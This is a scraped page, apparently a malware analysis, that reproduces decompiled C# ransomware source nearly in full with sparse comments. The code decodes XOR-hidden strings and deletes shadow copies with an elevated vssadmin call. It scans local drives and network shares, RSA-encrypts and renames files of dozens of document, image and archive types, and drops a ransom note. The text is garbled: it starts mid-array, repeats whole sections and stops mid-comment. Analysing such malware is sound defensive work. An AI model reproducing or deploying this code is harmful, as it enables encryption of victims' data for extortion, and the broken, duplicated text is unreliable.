0xf6, 0xd8, 0xda, 0xf5, 200, 0xdf, 0xd0, 250, 0xe3, 0xc1, 160, 0xa9, 0xe2, 0xc3, 0xf3, 0xe2, 0xf9, 250, 0xd6, 0xdf, 0xfb, 230, 0xfb, 220, 0xf9, 220, 0xdd, 0xdf, 0xf3, 0xda, 0xc5, 240, 200, 0xf7, 0xfe, 0xa2, 0xe0, 0xd8, 0xc2, 0xa5, 0xe7, 0xe5, 0xc7, 0xc4, 0xc0, 0xe5, 0xf2, 230, 0xba, 0xf6, 0xa8, 0xe8, 0xe2, 0xa2, 0xcb, 0xd7, 0xcb, 0xf4, 0xe5, 0xda, 0xd4, 0xfd, 0xa1, 0xcb, 220, 0xdb, 0xd4, 0xe1, 0xa5, 0xc9, 0xa6, 0xf3, 0xa5, 0xd9, 0xda, 0xa8, 0xe7, 0xe0, 0xc4, 0xfe, 0xf9, 0xc1, 0xd3, 200, 0xf7, 0xd3, 0xe2, 0xeb, 0xc9, 200, 0xa7, 0xf8, 0xfe, 0xff, 0xa4, 0xfc, 0xa4, 0xe5, 0xc2, 0xc2, 0xf7, 0xf9, 0xdb, 0xda, 0xa7, 0xde, 0xc9, 0xa3, 0xd9, 0xc1, 240, 0xc4, 0xa7, 0xc3, 0xd5, 0xf2, 240, 0xfb, 0xc5, 0xf4, 0xd4, 0xf2, 0xfc, 250, 0xa8, 0xf8, 0xe5, 0xa8, 0xe9, 0xa6, 0xa2, 0xf5, 0xe3, 0xdb, 0xfd, 0xf4, 0xcb, 160, 0xd6, 0xba, 0xe5, 0xc7, 0xf6, 0xdd, 0xa7, 0xf5, 0xe4, 0xdd, 0xc9, 190, 0xe4, 0xde, 0xc6, 0xc1, 0xc7, 0xe8, 0xf8, 0xa1, 0xe3, 0xf9, 0xe8, 0xe7, 200, 0xfc, 0xc3, 0xe3, 0xd6, 0xdf, 0xf2, 0xd8, 0xc0, 0xac, 0xac, 0xad, 190, 220, 0xfe, 0xf5, 0xe4, 0xfd, 0xe4, 0xe2, 0xaf, 0xad, 0xd4, 0xe9, 0xe1, 0xfe, 0xff, 0xf4, 0xff, 0xe5, 0xaf, 0xd0, 0xc0, 0xd0, 0xd3, 0xad, 190, 0xd4, 0xe9, 0xe1, 0xfe, 0xff, 0xf4, 0xff, 0xe5, 0xaf, 0xad, 190, 0xc3, 0xc2, 0xd0, 0xda, 0xf4, 0xe8, 0xc7, 240, 0xfd, 0xe4, 0xf4, 0xaf}; //  Windows Vista   -    . if (Environment.OSVersion.Version.Major &gt; 5) { new Thread(new ThreadStart(this.DelS)).Start(); } //       ... this.pbK = this.DeXOR(buffer3, this.X); string str = this.DeXOR(buffer2, this.X); this.vNF = this.DeXOR(buffer2, this.X); this.keyfile = this.DeXOR(a, this.X); this.kfExt = this.RetFExt(this.keyfile); this.kfName = this.RetFName(this.keyfile); this.keyCode = "."; //      Random random = new Random(); random.Next(0x61, 0x7a); for (int i = 0; i &lt; 1; i++) { this.keyCode = this.keyCode + Convert.ToChar(random.Next(0x61, 0x7a)).ToString(); } string[] textArray1 = new string[] { this.keyCode, (DateTime.Now.Day + 10).ToString(), Convert.ToChar(random.Next(0x61, 0x7a)).ToString(), Convert.ToChar(random.Next(0x61, 0x7a)).ToString(), Convert.ToChar(random.Next(0x61, 0x7a)).ToString(), Convert.ToChar(random.Next(0x61, 0x7a)).ToString(), (DateTime.Now.Month + 10).ToString(), Convert.ToChar(random.Next(0x61, 0x7a)).ToString() }; this.keyCode = string.Concat(textArray1); //      ... //       ... string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.System); folderPath = folderPath.Substring(0, folderPath.ToLower().IndexOf(@"\system")); string str3 = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles); this.SpecFolders.Add(folderPath.ToLower()); this.SpecFolders.Add(str3.ToLower()); this.SpecFolders.Add(this.DeXOR(new byte[] { 0xc3, 0xd4, 210, 200, 210, 0xdd, 0xd4, 0xc3 }, this.X)); this.SpecFolders.Add(this.DeXOR(new byte[] { 0xb5, 0xc3, 0xd4, 210, 200, 210, 0xdd, 0xd4, 0xbf, 0xd3, 0xd8, 0xdf }, this.X)); this.SpecFolders.Add(this.DeXOR(new byte[] { 0xc2, 0xe8, 0xe2, 0xe5, 0xf4, 0xfc, 0xb1, 0xc7, 0xfe, 0xfd, 0xe4, 0xfc, 0xf4, 0xb1, 0xd8, 0xff, 0xf7, 0xfe, 0xe3, 0xfc, 240, 0xe5, 0xf8, 0xfe, 0xff }, this.X)); /*  ... c:\windows c:\program files (x86) RECYCLER $RECYCLE.BIN System Volume Information */ ///    this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf2, 0xf5 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfd, 0xf5, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfc, 0xf5, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfc, 240, 0xe9 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf5, 0xf3, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf4, 0xe1, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 160, 0xf2, 0xf5 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfc, 0xf5 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf5, 0xf3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe1, 0xf5, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe1, 0xe1, 0xe5 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe9, 0xfd, 0xe2 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf5, 0xfe, 0xf2 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 240, 0xe3, 0xfb }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe5, 240, 0xe3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xa6, 0xeb }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe3, 240, 0xe3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xeb, 0xf8, 0xe1 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe5, 0xf8, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfb, 0xe1, 0xf6 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 240, 0xf8 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf3, 0xfc, 0xe1 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe1, 0xff, 0xf6 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf2, 0xf5, 0xe3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe1, 0xe2, 0xf5 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfb, 0xe1, 0xf4, 0xf6 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf5, 0xfe, 0xf2, 0xe9 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe9, 0xfd, 0xe2, 0xe9 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe1, 0xe1, 0xe5, 0xe9 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 240, 0xf2, 0xf2, 0xf5, 0xf3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfc, 0xf5, 0xf3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe3, 0xe5, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfe, 0xf5, 0xe5 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfe, 0xf5, 0xe2 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfe, 0xf5, 0xf3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfe, 0xf5, 0xf6 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf2, 0xe3, 0xa3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xff, 0xf4, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xff, 0xe3, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfe, 0xe3, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 240, 0xe3, 230 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe2, 0xe3, 0xa3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe2, 0xe3, 0xf7 }, this.X)); /* *   : .cd.ldf .mdf .max .dbf .epf .1cd .md .db .pdf .ppt .xls .doc .arj .tar .7z .rar .zip .tif .jpg .ai .bmp .png .cdr .psd .jpeg .docx .xlsx .pptx .accdb .mdb .rtf .odt .ods .odb .odg .cr2 .nef .nrf .orf .arw .sr2 .srf */ //    List&lt;string&gt; list = new List&lt;string&gt;(); Process process = new Process { StartInfo = { FileName = "cmd", Arguments = "/C net view", RedirectStandardOutput = true, UseShellExecute = false, CreateNoWindow = true } }; try { bool flag4; process.Start(); string str4 = process.StandardOutput.ReadToEnd(); int startIndex = 0; int index = 0; goto Label_0A8B; Label_0A48: startIndex = str4.IndexOf('\\', startIndex); if (startIndex == -1) { goto Label_0A98; } index = str4.IndexOf(' ', startIndex); list.Add(str4.Substring(startIndex, index - startIndex)); startIndex = index; Label_0A8B: flag4 = true; goto Label_0A48; } catch { } Label_0A98: num5 = 0; while (num5 &lt; list.Count) { Process process2 = new Process { StartInfo = { FileName = "cmd", Arguments = "/C net view " + list[num5], RedirectStandardOutput = true, UseShellExecute = false, CreateNoWindow = true } }; try { process2.Start(); string s = process2.StandardOutput.ReadToEnd(); byte[] bytes = Encoding.GetEncoding(0x4e3).GetBytes(s); char[] separator = new char[] { '\r', '\n' }; string[] strArray = Encoding.GetEncoding("CP866").GetString(bytes).Split(separator); for (int j = 0; j &lt; strArray.Length; j++) { if (strArray[j].IndexOf("") &gt; -1) { this.FullList.Add(list[num5] + @"\" + strArray[j].Substring(0, strArray[j].IndexOf(""))); } } } catch { } num5++; } ///    ...RSA 2048 RSACryptoServiceProvider provider = new RSACryptoServiceProvider(0x800); this.publicKey = provider.ToXmlString(false); //     XML this.privateKey = this.CryptKey(provider.ToXmlString(true)); //      ... } /////        ssda.far private void SaveKey(string f, string k) { string str = this.keyfile.Substring(0, this.keyfile.Length - 4); if (!File.Exists(f + @"\" + this.keyfile)) { try { File.WriteAllText(f + @"\" + this.keyfile, k); } catch { } } else { try { File.WriteAllText(string.Concat(new object[] { f, @"\", str, this.AmountFiles(f), ".", this.kfExt }), k); } catch { } } } /////              private void SaveNotes() { List&lt;string&gt; list = new List&lt;string&gt; { //     Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory), //   Environment.GetFolderPath(Environment.SpecialFolder.Personal) //   }; for (int i = 0; i &lt; list.Count; i++) //    { this.SaveKey(list[i], this.privateKey); //     ssda.far this.AddNote(list[i]); //      } } /////   private void GetDirs(DirectoryInfo pth) { try { DirectoryInfo[] directories = pth.GetDirectories(); foreach (DirectoryInfo info in directories) { this.GetFiles(info); this.GetDirs(info); } } catch { } } /////       private void GetDrives() { try { string[] logicalDrives = Environment.GetLogicalDrives(); for (int i = 0; i &lt; logicalDrives.Length; i++) { DriveInfo info = new DriveInfo(logicalDrives[i]); if ((info.DriveType == DriveType.Fixed) || (info.DriveType == DriveType.Network)) { this.GetDirs(info.RootDirectory); } } } catch { } } ////      ... private void GetFiles(DirectoryInfo folder) { try { string[] files = Directory.GetFiles(folder.FullName, "*.*"); foreach (string str in files) { foreach (string str2 in this.extensions) //    { if ((str.ToLower().IndexOf(str2) &gt; -1) &amp;&amp; (str.ToLower().IndexOf(str2 + ".") == -1)) { string str3 = str; if (str.IndexOf(this.vNF) == -1) { this.CF(str3); ///  ... } } } } } catch { } } } }</span></span></code> , 0xd8, 0xc2, 0xa5, 0xe7, 0xe5, 0xc7, 0xc4, 0xc0, 0xe5, 0xf2, <code class="cs hljs"><span class="hljs-keyword"><span class="hljs-keyword">namespace</span></span> <span class="hljs-title"><span class="hljs-title">nekema</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-keyword"><span class="hljs-keyword">class</span></span> <span class="hljs-title"><span class="hljs-title">Form1</span></span> : <span class="hljs-title"><span class="hljs-title">Form</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">private</span></span> <span class="hljs-keyword"><span class="hljs-keyword">int</span></span> blocksize = <span class="hljs-number"><span class="hljs-number">0xf5</span></span>; <span class="hljs-comment"><span class="hljs-comment">//245  . private IContainer components = null; private List&lt;string&gt; extensions = new List&lt;string&gt;(); //   private List&lt;string&gt; FullList = new List&lt;string&gt;(); //    private string keyCode; //   .  . private string keyfile = ""; //    "ssda.far" private string kfExt = ""; //   "far" private string kfName = ""; //   "ssda" private static readonly int MAX_PATH = 260; //   private string pbK = ""; //        . private string privateKey = ""; //        private string publicKey = ""; //     . private int repeatCount = 3; //    private List&lt;string&gt; SpecFolders = new List&lt;string&gt;(); private string vNF = ""; //   HOW--TO--RETURN--YOUR--FILES.jpg private byte X = 0x91; // //      DEXOR = 145 //////        HOW--TO--RETURN--YOUR--FILES.jpg private void AddNote(string f) { string currentDirectory = Environment.CurrentDirectory; if (f != currentDirectory) { try { if (!File.Exists(f + @"\" + this.vNF)) { Resources.ne5.Save(f + @"\" + this.vNF); } } catch { } } } ////////   -   private void CF(string f1) { byte[] destinationArray = new byte[this.blocksize]; try { byte[] sourceArray = File.ReadAllBytes(f1); if ((sourceArray.Length / (this.repeatCount + 5)) &gt;= this.blocksize) { RSACryptoServiceProvider provider = new RSACryptoServiceProvider(0x800); provider.FromXmlString(this.publicKey); byte[] buffer3 = new byte[sourceArray.Length + (this.repeatCount * 11)]; byte[] buffer4 = new byte[sourceArray.Length - (this.repeatCount * this.blocksize)]; for (int i = 0; i &lt; this.repeatCount; i++) { Array.Copy(sourceArray, this.blocksize * i, destinationArray, 0, this.blocksize); byte[] buffer5 = provider.Encrypt(destinationArray, false); Array.Copy(buffer5, 0, buffer3, i * (this.blocksize + 11), buffer5.Length); } Array.Copy(sourceArray, this.repeatCount * this.blocksize, buffer4, 0, buffer4.Length); Array.Copy(buffer4, 0, buffer3, this.repeatCount * (this.blocksize + 11), buffer4.Length); try { File.WriteAllBytes(f1, buffer3); File.Move(f1, f1 + this.keyCode); } catch { } } } catch { } } //////          -   private string CryptKey(string s) { string str = ""; byte[] array = new byte[s.Length]; byte[] destinationArray = new byte[this.blocksize]; byte[] bytes = new byte[this.blocksize + 11]; double num = Math.Ceiling((double) (((double) s.Length) / ((double) this.blocksize))); if (s.Length &lt; (num * this.blocksize)) { int length = s.Length; for (int i = 0; i &lt; ((num * this.blocksize) - length); i++) { s = s + " "; } } array = Encoding.Default.GetBytes(s); Array.Reverse(array); try { RSACryptoServiceProvider provider = new RSACryptoServiceProvider(0x800); provider.FromXmlString(this.pbK); for (int j = 0; j &lt; num; j++) { Array.Copy(array, j * this.blocksize, destinationArray, 0, this.blocksize); bytes = provider.Encrypt(destinationArray, false); str = str + Encoding.Default.GetString(bytes); } } catch { } return str; } /////     private void DelS() { byte[] a = new byte[] { 0xe7, 0xe2, 0xe2, 240, 0xf5, 0xfc, 0xf8, 0xff, 0xbf, 0xf4, 0xe9, 0xf4 }; byte[] buffer2 = new byte[] { 0xd5, 0xf4, 0xfd, 0xf4, 0xe5, 0xf4, 0xb1, 0xc2, 0xf9, 240, 0xf5, 0xfe, 230, 0xe2, 0xb1, 190, 0xd0, 0xfd, 0xfd, 0xb1, 190, 0xc0, 0xe4, 0xf8, 0xf4, 0xe5 }; Process process = new Process { StartInfo = { FileName = this.DeXOR(a, this.X), Arguments = this.DeXOR(buffer2, this.X), WindowStyle = ProcessWindowStyle.Hidden, CreateNoWindow = true, UseShellExecute = true, Verb = "runas" } }; try { process.Start(); } catch { } } /////          XOR private string DeXOR(byte[] A, int x) { string str = ""; byte[] bytes = new byte[A.Length]; for (int i = 0; i &lt; A.Length; i++) { bytes[i] = (byte) (A[i] ^ x); } return (str = Encoding.Default.GetString(bytes)); } /////    . private void Init() { this.Prep(); //  this.SaveNotes(); //      this.GetDrives(); //   this.NetScan(); //   this.SetDesktopWallpaper(); //        ,    } private void Prep() { int num5; //  a = ssda.far byte[] a = new byte[] { 0xe2, 0xe2, 0xf5, 240, 0xbf, 0xf7, 240, 0xe3 }; //buffer2 = HOW--TO--RETURN--YOUR--FILES.jpg byte[] buffer2 = new byte[] {0xd9, 0xde, 0xc6, 0xbc, 0xbc, 0xc5, 0xde, 0xbc, 0xbc, 0xc3, 0xd4, 0xc5, 0xc4, 0xc3, 0xdf, 0xbc, 0xbc, 200, 0xde, 0xc4, 0xc3, 0xbc, 0xbc, 0xd7, 0xd8, 0xdd, 0xd4, 0xc2, 0xbf, 0xfb, 0xe1, 0xf6}; //buffer3 = &lt;RSAKeyValue &lt;Modulus&gt;+fFYiO9CH9iZwwzlsQ3X+qZ7Uyx290OhZ1WvLt6cmDd5oRsLoHLnoGws1CWFMOGFjtbaROSkTg3W+72/TjzHkuPp2W/RC7FBC4JpgguCi4x4ye4HEwRkQ75tHhig08hRKm1a7wlwYl8zLAzM8AwTPLh770MOzPqF1fJMKZCAtdUgIKdYNAkrP18sRbshkGNjwjMhMLNbKTaYfo3qIS4vtVUQtcw+g9ys3ZFZetKEl0ZMJEp4X7b4HK9vqUohPBYfBszXY6ion5m5tSSfhJK6OX2HPaU6RDcajTeEcmk9it9x73drJleZ1G+tVgL6duLX/uOWPVyi0rhyvYmRrGNcIQ==&lt;/Modulus&gt;&lt;Exponent&gt;AQAB&lt;/Exponent&gt;&lt;/RSAKeyValue&gt; byte[] buffer3 = new byte[] { 0xad, 0xc3, 0xc2, 0xd0, 0xda, 0xf4, 0xe8, 0xc7, 240, 0xfd, 0xe4, 0xf4, 0xaf, 0xad, 220, 0xfe, 0xf5, 0xe4, 0xfd, 0xe4, 0xe2, 0xaf, 0xba, 0xf7, 0xd7, 200, 0xf8, 0xde, 0xa8, 210, 0xd9, 0xa8, 0xf8, 0xcb, 230, 230, 0xeb, 0xfd, 0xe2, 0xc0, 0xa2, 0xc9, 0xba, 0xe0, 0xcb, 0xa6, 0xc4, 0xe8, 0xe9, 0xa3, 0xa8, 0xa1, 0xde, 0xf9, 0xcb, 160, 0xc6, 0xe7, 0xdd, 0xe5, 0xa7, 0xf2, 0xfc, 0xd5,0xf5, 0xa4, 0xfe, 0xc3, 0xe2, 0xdd, 0xfe, 0xd9, 0xdd, 0xff, 0xfe, 0xd6, 230, 0xe2, 160, 210,0xc6, 0xd7, 220, 0xde, 0xd6, 0xd7, 0xfb, 0xe5, 0xf3, 240, 0xc3, 0xde, 0xc2, 250, 0xc5, 0xf6, 0xa2, 0xc6, 0xba, 0xa6, 0xa3, 190, 0xc5, 0xfb, 0xeb, 0xd9, 250, 0xe4, 0xc1, 0xe1, 0xa3, 0xc6,190, 0xc3, 210, 0xa6, 0xd7, 0xd3, 210, 0xa5, 0xdb, 0xe1, 0xf6, 0xf6, 0xe4, 210, 0xf8, 0xa5, 0xe9, 0xa5, 0xe8, 0xf4, 0xa5, 0xd9, 0xd4, 230, 0xc3, 250, 0xc0, 0xa6, 0xa4, 0xe5, 0xd9, 0xf9, 0xf8, 0xf6, 0xa1, 0xa9, 0xf9, 0xc3, 0xda, 0xfc, 160, 240, 0xa6, 230, 0xfd, 230, 200, 0xfd, 0xa9, 0xeb, 0xdd, 0xd0, 0xeb, 220, 0xa9, 0xd0, 230, 0xc5, 0xc1, 0xdd, 0xf9, 0xa6, 0xa6, 0xa1, 220, 0xde, 0xeb, 0xc1, 0xe0, 0xd7, 160, 0xf7, 0xdb, 220, 0xda, 0xcb, 210, 0xd0, 0xe5, 0xf5, 0xc4, 0xf6, 0xd8, 0xda, 0xf5, 200, 0xdf, 0xd0, 250, 0xe3, 0xc1, 160, 0xa9, 0xe2, 0xc3, 0xf3, 0xe2, 0xf9, 250, 0xd6, 0xdf, 0xfb, 230, 0xfb, 220, 0xf9, 220, 0xdd, 0xdf, 0xf3, 0xda, 0xc5, 240, 200, 0xf7, 0xfe, 0xa2, 0xe0, 0xd8, 0xc2, 0xa5, 0xe7, 0xe5, 0xc7, 0xc4, 0xc0, 0xe5, 0xf2, 230, 0xba, 0xf6, 0xa8, 0xe8, 0xe2, 0xa2, 0xcb, 0xd7, 0xcb, 0xf4, 0xe5, 0xda, 0xd4, 0xfd, 0xa1, 0xcb, 220, 0xdb, 0xd4, 0xe1, 0xa5, 0xc9, 0xa6, 0xf3, 0xa5, 0xd9, 0xda, 0xa8, 0xe7, 0xe0, 0xc4, 0xfe, 0xf9, 0xc1, 0xd3, 200, 0xf7, 0xd3, 0xe2, 0xeb, 0xc9, 200, 0xa7, 0xf8, 0xfe, 0xff, 0xa4, 0xfc, 0xa4, 0xe5, 0xc2, 0xc2, 0xf7, 0xf9, 0xdb, 0xda, 0xa7, 0xde, 0xc9, 0xa3, 0xd9, 0xc1, 240, 0xc4, 0xa7, 0xc3, 0xd5, 0xf2, 240, 0xfb, 0xc5, 0xf4, 0xd4, 0xf2, 0xfc, 250, 0xa8, 0xf8, 0xe5, 0xa8, 0xe9, 0xa6, 0xa2, 0xf5, 0xe3, 0xdb, 0xfd, 0xf4, 0xcb, 160, 0xd6, 0xba, 0xe5, 0xc7, 0xf6, 0xdd, 0xa7, 0xf5, 0xe4, 0xdd, 0xc9, 190, 0xe4, 0xde, 0xc6, 0xc1, 0xc7, 0xe8, 0xf8, 0xa1, 0xe3, 0xf9, 0xe8, 0xe7, 200, 0xfc, 0xc3, 0xe3, 0xd6, 0xdf, 0xf2, 0xd8, 0xc0, 0xac, 0xac, 0xad, 190, 220, 0xfe, 0xf5, 0xe4, 0xfd, 0xe4, 0xe2, 0xaf, 0xad, 0xd4, 0xe9, 0xe1, 0xfe, 0xff, 0xf4, 0xff, 0xe5, 0xaf, 0xd0, 0xc0, 0xd0, 0xd3, 0xad, 190, 0xd4, 0xe9, 0xe1, 0xfe, 0xff, 0xf4, 0xff, 0xe5, 0xaf, 0xad, 190, 0xc3, 0xc2, 0xd0, 0xda, 0xf4, 0xe8, 0xc7, 240, 0xfd, 0xe4, 0xf4, 0xaf}; //  Windows Vista   -    . if (Environment.OSVersion.Version.Major &gt; 5) { new Thread(new ThreadStart(this.DelS)).Start(); } //       ... this.pbK = this.DeXOR(buffer3, this.X); string str = this.DeXOR(buffer2, this.X); this.vNF = this.DeXOR(buffer2, this.X); this.keyfile = this.DeXOR(a, this.X); this.kfExt = this.RetFExt(this.keyfile); this.kfName = this.RetFName(this.keyfile); this.keyCode = "."; //      Random random = new Random(); random.Next(0x61, 0x7a); for (int i = 0; i &lt; 1; i++) { this.keyCode = this.keyCode + Convert.ToChar(random.Next(0x61, 0x7a)).ToString(); } string[] textArray1 = new string[] { this.keyCode, (DateTime.Now.Day + 10).ToString(), Convert.ToChar(random.Next(0x61, 0x7a)).ToString(), Convert.ToChar(random.Next(0x61, 0x7a)).ToString(), Convert.ToChar(random.Next(0x61, 0x7a)).ToString(), Convert.ToChar(random.Next(0x61, 0x7a)).ToString(), (DateTime.Now.Month + 10).ToString(), Convert.ToChar(random.Next(0x61, 0x7a)).ToString() }; this.keyCode = string.Concat(textArray1); //      ... //       ... string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.System); folderPath = folderPath.Substring(0, folderPath.ToLower().IndexOf(@"\system")); string str3 = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles); this.SpecFolders.Add(folderPath.ToLower()); this.SpecFolders.Add(str3.ToLower()); this.SpecFolders.Add(this.DeXOR(new byte[] { 0xc3, 0xd4, 210, 200, 210, 0xdd, 0xd4, 0xc3 }, this.X)); this.SpecFolders.Add(this.DeXOR(new byte[] { 0xb5, 0xc3, 0xd4, 210, 200, 210, 0xdd, 0xd4, 0xbf, 0xd3, 0xd8, 0xdf }, this.X)); this.SpecFolders.Add(this.DeXOR(new byte[] { 0xc2, 0xe8, 0xe2, 0xe5, 0xf4, 0xfc, 0xb1, 0xc7, 0xfe, 0xfd, 0xe4, 0xfc, 0xf4, 0xb1, 0xd8, 0xff, 0xf7, 0xfe, 0xe3, 0xfc, 240, 0xe5, 0xf8, 0xfe, 0xff }, this.X)); /*  ... c:\windows c:\program files (x86) RECYCLER $RECYCLE.BIN System Volume Information */ ///    this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf2, 0xf5 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfd, 0xf5, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfc, 0xf5, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfc, 240, 0xe9 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf5, 0xf3, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf4, 0xe1, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 160, 0xf2, 0xf5 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfc, 0xf5 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf5, 0xf3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe1, 0xf5, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe1, 0xe1, 0xe5 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe9, 0xfd, 0xe2 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf5, 0xfe, 0xf2 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 240, 0xe3, 0xfb }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe5, 240, 0xe3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xa6, 0xeb }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe3, 240, 0xe3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xeb, 0xf8, 0xe1 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe5, 0xf8, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfb, 0xe1, 0xf6 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 240, 0xf8 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf3, 0xfc, 0xe1 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe1, 0xff, 0xf6 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf2, 0xf5, 0xe3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe1, 0xe2, 0xf5 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfb, 0xe1, 0xf4, 0xf6 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf5, 0xfe, 0xf2, 0xe9 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe9, 0xfd, 0xe2, 0xe9 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe1, 0xe1, 0xe5, 0xe9 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 240, 0xf2, 0xf2, 0xf5, 0xf3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfc, 0xf5, 0xf3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe3, 0xe5, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfe, 0xf5, 0xe5 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfe, 0xf5, 0xe2 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfe, 0xf5, 0xf3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfe, 0xf5, 0xf6 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf2, 0xe3, 0xa3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xff, 0xf4, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xff, 0xe3, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfe, 0xe3, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 240, 0xe3, 230 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe2, 0xe3, 0xa3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe2, 0xe3, 0xf7 }, this.X)); /* *   : .cd.ldf .mdf .max .dbf .epf .1cd .md .db .pdf .ppt .xls .doc .arj .tar .7z .rar .zip .tif .jpg .ai .bmp 